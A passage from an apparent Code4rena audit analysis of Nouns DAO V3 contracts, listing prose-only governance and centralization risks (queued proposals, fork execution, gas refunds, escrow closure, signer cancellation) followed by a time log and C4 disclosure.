Queued proposals are still active, since it has not been executed. As such, consider not allowing creation of proposal when proposal state is queued. Given Nouns Dao only allow 1 active proposal per proposer, there could be a scenario where there are multiple proposals queued if proposals are not yet executed.

### 2.4 Consider not allowing executing fork if not a token holder
In the contest Docs, it is stated that any token holder can execute fork if fork threshold is met. However, anybody, not just token holders can execute fork via `executeFork()` once threshold is met. Since Nouns govern Noun DAO, consider only allowing only token holders to execute fork.

## [03] Centralization risks

### 3.1  Vote casters may lose gas refund if contract is underfunded `_refundGas`
Any one can fund the `NounsDAOV3Votes.sol` contract, but it is presumably the DAO funding it to refund gas for voters. If contract ETH balance is insufficient, voters may not get refunded their gas when voting.

### 3.2 DAO can affect proposal thresholds anytime by adjusting totalSupply 
In the new NounsDaoV3Logic, all proposal thresholds are calculated using an adjusted total supply instead of the fixed nouns supply previously. This adjusted total supply represents the total supply of nouns minus nouns owed by DAO. If in any of the address the Nouns DAO mints/transfer nouns tokens, it could affect proposal thresholds by increasing/decreasing it respectfully, potentially preventing/allowing proposals to be created.

### 3.3 DAO can close escrow and withdraw escrowed tokens anytime
In `NounsDAOForkEscrow.sol`, any nouns tokens sent to the contract to be escrowed faces a potential risk of DAO closing escrow at anytime, essentially locking up the tokens and cannot be unescrowed, with the tokens only being able to be withdrawn by the DAO.

### 3.4 `NounsDAOV3Proposals.cancel()`: Signers can collude to cancel proposer proposal anytime by adjusting voting power 
With the introduction of proposing proposals with other signers, it also gives the power to signers to cancel proposals at anytime without the need to consult proposer/other signers. This opens up the ability for any signers or even the proposer to invalidate votes simply by cancelling the proposal if they do not agree with the direction of the state that proposal is approaching (`Defeated/Succeeded`).

## [04] Time Spent
- Day 1: Compare v2 and v3 NounsDao versions, noting new mechanisms such as proposal editing, proposal by sig and objection only period.
- Day 2: Audit NounsV3Logic coupled with NounsV3Proposals
- Day 3: Audit NounsV3Logic coupled with NounsV3Vote and NoundsDAOV3Admin 
- Day 4: Finish up Analysis 

### Time spent:
48 hours



***


# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
